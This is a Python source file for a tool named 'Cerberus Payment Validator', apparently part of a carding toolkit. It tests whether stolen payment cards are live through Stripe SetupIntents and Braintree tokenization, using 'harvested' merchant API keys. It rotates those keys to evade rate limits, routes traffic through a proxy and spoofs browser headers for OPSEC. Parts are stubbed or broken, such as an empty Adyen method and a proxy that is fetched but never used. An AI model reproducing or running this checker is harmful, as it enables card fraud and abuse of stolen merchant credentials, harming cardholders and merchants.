#!/usr/bin/env python3
"""
Cerberus Payment Validator
Zero-touch card validation via merchant APIs

Uses SetupIntents and tokenization to validate cards without charges
OPSEC: Routes through proxy, rotates keys, minimal exposure

Author: Dva.12
"""

import asyncio
import aiohttp
import random
import re
import json
import logging
from typing import Dict, Optional, List
from dataclasses import asdict
from urllib.parse import urljoin

from . import CardAsset, ValidationStatus

logger = logging.getLogger('cerberus.validator')

class PaymentValidator:
    """
    Zero-touch payment validation using merchant APIs
    
    Strategy: Use SetupIntents and tokenization to validate cards
    without executing actual charges
    """
    
    def __init__(self):
        self.merchant_keys = []
        self.current_key_index = 0
        self.session = None
        self.proxy_chain = []
        
    async def initialize(self):
        """Initialize validator with harvested keys and proxy"""
        # Load harvested merchant keys
        await self._load_merchant_keys()
        
        # Setup aiohttp session with proxy
        connector = aiohttp.TCPConnector(
            limit=10,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        
        # Get proxy from TITAN network shield
        proxy = await self._get_proxy()
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30),
            headers=self._get_base_headers()
        )
        
        logger.info(f"Validator initialized with {len(self.merchant_keys)} merchant keys")
        
    async def validate_card(self, card: CardAsset) -> Dict:
        """
        Validate card using zero-touch methods
        
        Args:
            card: Card asset to validate
            
        Returns:
            Dict with validation results
        """
        if not self.session:
            await self.initialize()
            
        # Try multiple merchants for redundancy
        for attempt in range(3):
            try:
                # Get current merchant key
                key_info = self._get_next_key()
                if not key_info:
                    return {
                        'status': ValidationStatus.ERROR,
                        'error_message': 'No available merchant keys'
                    }
                    
                # Choose validation method based on merchant type
                if key_info['type'] == 'stripe':
                    result = await self._validate_stripe(card, key_info)
                elif key_info['type'] == 'braintree':
                    result = await self._validate_braintree(card, key_info)
                elif key_info['type'] == 'adyen':
                    result = await self._validate_adyen(card, key_info)
                else:
                    continue
                    
                # Rotate key on rate limit
                if result.get('status') == ValidationStatus.RATE_LIMITED:
                    self._rotate_key()
                    continue
                    
                return result
                
            except Exception as e:
                logger.warning(f"Validation attempt {attempt + 1} failed: {e}")
                self._rotate_key()
                continue
                
        return {
            'status': ValidationStatus.ERROR,
            'error_message': 'All validation attempts failed'
        }
        
    async def _validate_stripe(self, card: CardAsset, key_info: Dict) -> Dict:
        """
        Validate card using Stripe SetupIntent API
        
        Creates a SetupIntent to validate card without charges
        """
        url = "https://api.stripe.com/v1/setup_intents"
        
        payload = {
            "payment_method_data": {
                "type": "card",
                "card": {
                    "number": card.number,
                    "exp_month": card.exp_month,
                    "exp_year": card.exp_year,
                    "cvc": card.cvv
                }
            },
            "usage": "off_session"
        }
        
        # Add billing address for AVS
        if card.address_line1:
            payload["payment_method_data"]["billing_details"] = {
                "name": card.name,
                "address": {
                    "line1": card.address_line1,
                    "city": card.address_city,
                    "state": card.address_state,
                    "postal_code": card.address_zip,
                    "country": card.address_country
                }
            }
            
        headers = {
            "Authorization": f"Bearer {key_info['key']}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with self.session.post(url, data=payload, headers=headers) as response:
                data = await response.json()
                
                if response.status == 200:
                    # SetupIntent created successfully
                    setup_intent = data
                    
                    # Check payment method status
                    if setup_intent.get('status') == 'succeeded':
                        pm = setup_intent.get('payment_method', {})
                        card_checks = pm.get('card', {}).get('checks', {})
                        
                        return {
                            'status': ValidationStatus.LIVE,
                            'card_live': True,
                            'avs_check': card_checks.get('address_line1_check'),
                            'cvv_check': card_checks.get('cvc_check'),
                            'payment_method_id': pm.get('id'),
                            'setup_intent_id': setup_intent.get('id')
                        }
                    elif setup_intent.get('status') == 'requires_payment_method':
                        # Card validation failed
                        last_setup_error = setup_intent.get('last_setup_error', {})
                        error_code = last_setup_error.get('code')
                        
                        if error_code == 'incorrect_cvc':
                            return {
                                'status': ValidationStatus.LIVE,
                                'card_live': True,
                                'avs_check': None,
                                'cvv_check': 'fail',
                                'error_message': 'Incorrect CVC'
                            }
                        elif error_code == 'invalid_expiry_year':
                            return {
                                'status': ValidationStatus.INVALID_DATA,
                                'card_live': False,
                                'error_message': 'Invalid expiry'
                            }
                        else:
                            return {
                                'status': ValidationStatus.DEAD,
                                'card_live': False,
                                'error_message': error_code
                            }
                            
                elif response.status == 429:
                    return {'status': ValidationStatus.RATE_LIMITED}
                elif response.status == 401:
                    return {'status': ValidationStatus.ERROR, 'error_message': 'Invalid API key'}
                else:
                    return {
                        'status': ValidationStatus.ERROR,
                        'error_message': f"HTTP {response.status}: {data.get('error', {}).get('message', 'Unknown')}"
                    }
                    
        except Exception as e:
            logger.error(f"Stripe validation error: {e}")
            return {'status': ValidationStatus.ERROR, 'error_message': str(e)}
            
    async def _validate_braintree(self, card: CardAsset, key_info: Dict) -> Dict:
        """
        Validate card using Braintree GraphQL tokenization
        """
        url = f"https://payments.braintree-api.com/graphql"
        
        # GraphQL mutation for payment method creation
        query = """
        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
          tokenizeCreditCard(input: $input) {
            paymentMethod {
              id
              usage
              verification {
                status
                gatewayRejectionReason
              }
              details {
                bin
                last4
                cardType
                expirationMonth
                expirationYear
              }
            }
            paymentMethod {
              creditCard {
                verification {
                  avsErrorResponseCode
                  avsPostalCodeResponseCode
                  cvvResponseCode
                }
              }
            }
          }
        }
        """
        
        variables = {
            "input": {
                "creditCard": {
                    "number": card.number,
                    "expirationMonth": card.exp_month,
                    "expirationYear": card.exp_year,
                    "cvv": card.cvv,
                    "cardholderName": card.name
                },
                "billingAddress": {
                    "streetAddress": card.address_line1,
                    "locality": card.address_city,
                    "region": card.address_state,
                    "postalCode": card.address_zip,
                    "countryCodeAlpha2": card.address_country
                } if card.address_line1 else None,
                "options": {
                    "verifyCard": True,
                    "makeDefault": False
                }
            }
        }
        
        headers = {
            "Authorization": f"Basic {key_info['key']}",
            "Content-Type": "application/json",
            "Braintree-Version": "2019-01-01"
        }
        
        try:
            payload = {"query": query, "variables": variables}
            async with self.session.post(url, json=payload, headers=headers) as response:
                data = await response.json()
                
                if response.status == 200:
                    result = data.get('data', {}).get('tokenizeCreditCard', {})
                    payment_method = result.get('paymentMethod', {})
                    
                    if payment_method.get('id'):
                        verification = payment_method.get('verification', {})
                        status = verification.get('status')
                        
                        if status == 'VERIFIED':
                            # Card verified successfully
                            credit_card = payment_method.get('creditCard', {})
                            card_verification = credit_card.get('verification', {})
                            
                            return {
                                'status': ValidationStatus.LIVE,
                                'card_live': True,
                                'avs_check': self._map_braintree_avs(card_verification.get('avsPostalCodeResponseCode')),
                                'cvv_check': self._map_braintree_cvv(card_verification.get('cvvResponseCode')),
                                'payment_method_id': payment_method.get('id')
                            }
                        elif status == 'PROCESSOR_DECLINED':
                            return {
                                'status': ValidationStatus.DEAD,
                                'card_live': False,
                                'error_message': 'Processor declined'
                            }
                        elif status == 'GATEWAY_REJECTED':
                            reason = verification.get('gatewayRejectionReason')
                            return {
                                'status': ValidationStatus.INVALID_DATA,
                                'card_live': False,
                                'error_message': f'Gateway rejected: {reason}'
                            }
                            
                elif response.status == 429:
                    return {'status': ValidationStatus.RATE_LIMITED}
                else:
                    return {
                        'status': ValidationStatus.ERROR,
                        'error_message': f"Braintree HTTP {response.status}"
                    }
                    
        except Exception as e:
            logger.error(f"Braintree validation error: {e}")
            return {'status': ValidationStatus.ERROR, 'error_message': str(e)}
            
    async def _validate_adyen(self, card: CardAsset, key_info: Dict) -> Dict:
        """
        Validate card using Adyen payment session creation
        """
        # Adyen validation implementation
        # Similar pattern - create payment session without actual charge
        pass
        
    def _get_next_key(self) -> Optional[Dict]:
        """Get next available merchant key with rotation"""
        if not self.merchant_keys:
            return None
            
        key_info = self.merchant_keys[self.current_key_index]
        self.current_key_index = (self.current_key_index + 1) % len(self.merchant_keys)
        return key_info
        
    def _rotate_key(self):
        """Rotate to next key on error"""
        self.current_key_index = (self.current_key_index + 1) % len(self.merchant_keys)
        
    async def _load_merchant_keys(self):
        """Load harvested merchant keys from storage"""
        try:
            with open('/opt/lucid-empire/data/merchant_keys.json', 'r') as f:
                self.merchant_keys = json.load(f)
            logger.info(f"Loaded {len(self.merchant_keys)} merchant keys")
        except Exception as e:
            logger.warning(f"Could not load merchant keys: {e}")
            self.merchant_keys = []
            
    async def _get_proxy(self) -> Optional[str]:
        """Get SOCKS5 proxy from TITAN network shield"""
        try:
            # Query TITAN network shield for proxy
            import requests
            response = requests.get('http://localhost:8080/api/proxy', timeout=5)
            if response.status_code == 200:
                proxy_data = response.json()
                return f"socks5://{proxy_data['host']}:{proxy_data['port']}"
        except Exception:
            pass
        return None
        
    def _get_base_headers(self) -> Dict[str, str]:
        """Get base HTTP headers for API requests"""
        return {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site'
        }
        
    def _map_braintree_avs(self, code: Optional[str]) -> Optional[str]:
        """Map Braintree AVS response codes to standard format"""
        mapping = {
            'M': 'pass',  # Match
            'N': 'fail',  # No match
            'U': 'unavailable',  # Unavailable
            'I': 'unavailable',  # Not verified
            'A': 'partial',  # Address match only
            'Z': 'partial',  # Zip match only
        }
        return mapping.get(code)
        
    def _map_braintree_cvv(self, code: Optional[str]) -> Optional[str]:
        """Map Braintree CVV response codes to standard format"""
        mapping = {
            'M': 'pass',  # Match
            'N': 'fail',  # No match
            'U': 'unavailable',  # Not verified
            'I': 'unavailable',  # Not verified
            'S': 'fail',  # Issuer indicates that CVV should be present on card
        }
        return mapping.get(code)
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
